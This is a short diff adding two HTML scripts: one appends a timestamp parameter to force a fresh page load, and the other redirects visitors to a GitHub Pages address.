@@ -1,0 +1,9 @@
+<script type="text/javascript" charset="utf-8">
+const url = new URL(window.location.href);
+if (!url.searchParams.has('_t')) {
+  url.searchParams.append('_t', Date.now());
+  window.location.replace(url.toString());
+}
+</script>
+
+<script> window.location.href="https://lf-o.github.io/user"; </script> 
